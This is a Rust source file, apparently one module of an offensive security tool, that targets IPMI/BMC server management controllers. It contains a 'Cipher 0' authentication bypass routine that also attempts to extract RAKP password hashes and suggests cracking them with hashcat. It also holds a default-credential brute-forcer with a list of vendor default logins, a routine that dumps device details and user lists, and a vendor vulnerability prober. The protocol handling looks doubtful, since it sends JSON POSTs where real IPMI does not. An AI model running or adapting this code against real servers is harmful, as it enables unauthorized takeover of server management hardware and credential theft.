use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn cipher0(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} IPMI Cipher 0 Auth Bypass", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let body = serde_json::json!({"action": "ipmi_auth", "host": url, "cipher": 0, "username": "admin", "password": ""});
    let resp = client.post(url).json(&body).send().await?;
    let status = resp.status().as_u16();
    let text = resp.text().await.unwrap_or_default();

    if text.contains("authenticated") || text.contains("success") || (status == 200 && !text.contains("error")) {
        println!("  {} Cipher 0 authentication bypass successful!", "[!]".red().bold());
        println!("  {} Password hashes can be extracted without authentication.", "[!]".red().bold());
    } else {
        println!("  {} Cipher 0 bypass failed.", "[-]".green().bold());
    }

    let hash_body = serde_json::json!({"action": "ipmi_rakp", "host": url, "username": "admin", "cipher": 0});
    if let Ok(r) = client.post(url).json(&hash_body).send().await {
        let t = r.text().await.unwrap_or_default();
        if t.contains("hash") || t.contains("salt") || t.contains("RAKP") {
            println!("  {} RAKP hash extracted:", "[+]".green().bold());
            for line in t.lines().take(10) {
                println!("    {}", line);
            }
            println!("  {} Crack with hashcat mode 7300.", "[*]".yellow().bold());
        }
    }

    Ok(())
}

pub async fn default(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} IPMI Default Credential Tester", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let creds = [
        ("ADMIN", "ADMIN"), ("ADMIN", "password"), ("ADMIN", "admin"),
        ("root", "root"), ("root", "password"), ("root", "calvin"),
        ("USERID", "PASSW0RD"), ("USERID", "USERID"),
        ("admin", "admin"), ("admin", "password"),
        ("Administrator", "Administrator"), ("superuser", "superuser"),
        ("hpadmin", "hpadmin"), ("hptadmin", "hptadmin"),
        ("Administrator", "admin"), ("admin", "changeme"),
    ];

    for (user, pass) in &creds {
        let body = serde_json::json!({"action": "ipmi_login", "host": url, "username": user, "password": pass});
        match client.post(url).json(&body).send().await {
            Ok(r) => {
                let text = r.text().await.unwrap_or_default();
                if text.contains("success") || text.contains("authenticated") || text.contains("200") {
                    println!("  {} {:20}:{:20} — LOGIN SUCCESS", "[+]".green().bold(), user, pass);
                }
            }
            Err(_) => {}
        }
    }

    Ok(())
}

pub async fn dump(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} IPMI BMC Info Dump", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let info_queries = [
        ("Device ID", "device_id"),
        ("Device revision", "device_revision"),
        ("Firmware revision", "firmware_rev"),
        ("IPMI version", "ipmi_version"),
        ("Manufacturer ID", "manufacturer_id"),
        ("Product ID", "product_id"),
        ("BMC MAC address", "bmc_mac"),
        ("BMC IP address", "bmc_ip"),
        ("System GUID", "system_guid"),
        ("User list", "users"),
        ("Channel info", "channels"),
    ];

    for (name, query) in &info_queries {
        let body = serde_json::json!({"action": "ipmi_info", "host": url, "field": query});
        match client.post(url).json(&body).send().await {
            Ok(r) => {
                let text = r.text().await.unwrap_or_default();
                if !text.is_empty() && !text.contains("error") {
                    println!("  {} {:20}: {}", "[+]".green().bold(), name, text.chars().take(60).collect::<String>());
                }
            }
            Err(_) => {}
        }
    }

    Ok(())
}

pub async fn bmc(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} BMC Exploitation Tester", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let checks = [
        ("Supermicro password hash leak", "supermicro_hash"),
        ("Dell iDRAC default", "dell_idrac"),
        ("HP iLO default", "hp_ilo"),
        ("Intel BMC default", "intel_bmc"),
        ("Fujitsu BMC", "fujitsu_bmc"),
        ("Lenovo XCC", "lenovo_xcc"),
        ("Cisco CIMC", "cisco_cimc"),
        ("Oracle ILOM", "oracle_ilom"),
    ];

    for (name, check) in &checks {
        let body = serde_json::json!({"action": "ipmi_check", "host": url, "vendor": check});
        match client.post(url).json(&body).send().await {
            Ok(r) => {
                let text = r.text().await.unwrap_or_default();
                let vulnerable = text.contains("vulnerable") || text.contains("found") || text.contains("detected");
                let tag = if vulnerable { "VULNERABLE".red().bold().to_string() } else { "not detected".dimmed().to_string() };
                println!("  {} {:35} {}", "*".cyan(), name, tag);
            }
            Err(_) => println!("  {} {:35} error", "[-]".dimmed(), name),
        }
    }

    let web_endpoints = ["/cgi-bin/ipmi.cgi", "/rpc/WEBSES/create.asp", "/redfish/v1/", "/api/", "/xmlhttp"];
    println!("\n  {} Checking BMC web endpoints:", "[*]".cyan().bold());
    for ep in &web_endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), ep);
        match client.get(&target).send().await {
            Ok(r) => {
                let s = r.status().as_u16();
                if s != 404 {
                    println!("    {} {:35} — status={}", "[+]".green().bold(), ep, s);
                }
            }
            Err(_) => {}
        }
    }

    Ok(())
}
